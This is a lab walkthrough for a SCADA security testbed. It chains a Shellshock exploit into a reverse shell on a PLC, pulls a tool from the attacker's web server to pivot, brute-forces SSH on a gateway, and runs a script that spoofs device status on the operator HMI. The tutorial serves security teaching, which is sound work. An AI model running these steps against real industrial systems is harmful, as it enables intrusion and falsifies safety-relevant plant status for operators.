# Multi Stage Attack scenario

This page outlines an attack targeting the Internal Gateway, which is not directly accessible from the attacker machine. To overcome this limitation, the attacker leverage ShellShock vulnerability in the Genera-PLC to pivot and gain access to the target. Then, traffic is spoofed to manipulate M-IED1 device. Notably, all files and tools required to execute this attack are already included within the provided Docker container.

- Use the attacker node:
```bash
docker exec -ti Attacker-Node bash
```

---

The first stage of the attack path exploits the Shellshock vulnerability in the General-PLC, specifically targeting the CGI-Bin module of the Apache web server. This vulnerability enables attackers to inject and execute malicious commands through specially crafted HTTP requests since the CGI (Common Gateway Interface) scripts on Apache invoke the Bash shell for processing the HTTP response. 

- Execute the exploit:
```bash
python3 shellshock.py 10.0.1.100 4444 http://10.0.1.66//cgi-bin/stats
```

![Shellshock Exploit](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/shellshock.png "Figure: Shellshock Exploit")

- Establish a reverse shell listener:
```bash
nc -lvnp 4444
```

![Reverse Shell](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/reverse.png "Figure: Reverse Shell")

To progress further along the attack path, the attacker must perform pivoting to reach the I-Gateway. Indeed, this device is typically unreachable from the SCADA Network. However, by compromising the General-PLC, the attacker can bypass these restrictions and establish a connection to the I-Gateway using port forwarding techniques. It is worth noting that the shell upgrade has already been performed. For those interested in understanding how to execute the shell upgrade, detailed guidance can be found [this link](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

- Establish a webserver:
```bash
python3 -m http.server
```
![Webserver](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/webserver.png "Figure: Webserver")

- Downloading the required tool:
```bash
wget http://10.0.1.100/port-forward.py
```
![Tool Download](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/download-tool.png "Figure: Tool Download")

- Port Forwarding:
```bash
python port-forward.py 2222:10.0.1.77:22
```
![ Port Forwarding](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/port-forwarding.png "Figure: Port Forwarding")

Then, the attacker is able to brute force the SSH service exposed by the gateway and take complete control of the endpoint. In fact, this service was exploited by finding the default credential. Therefore, this credential enables us also to gain root privilege.

- SSH Bruteforce:
```bash
hydra -L user.txt -P pass.txt -t 6 ssh://10.0.1.66:2222
```
![SSH Bruteforce](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/bruteforce-ssh.png "Figure: SSH Bruteforce")

- SSH Connection:
```bash
ssh -P 2222 admin@10.0.1.66
```
![SSH Access](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/ssh.png "Figure: SSH Access")

Finally, the attacker alters the communication passing through the I-Gateway in order to manipulate the visualization of the M-IED1 status.

- Copy the modification script to the I-Gateway:
```bash
scp -P 2222 coilModificationStealth.py admin@10.0.1.66:/home/admin/ #Attacker Node
```
- Execute the script on the I-Gateway:
```bash
python3 coilModificationStealth.py #I-Gateway
```

![Packet Modification](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/packetModification.png "Figure: Packet Modification")

Indeed, from the HMI interface, we can observe that MIED1 appears to be active. However, by using the TestNode, which is connected to the same network interface as the MPLC, it is possible to confirm that the displayed MIED1 is close.

![HMI](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/HMI.png "Figure: HMI")

![Coils](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/coils.png "Figure: Coils")
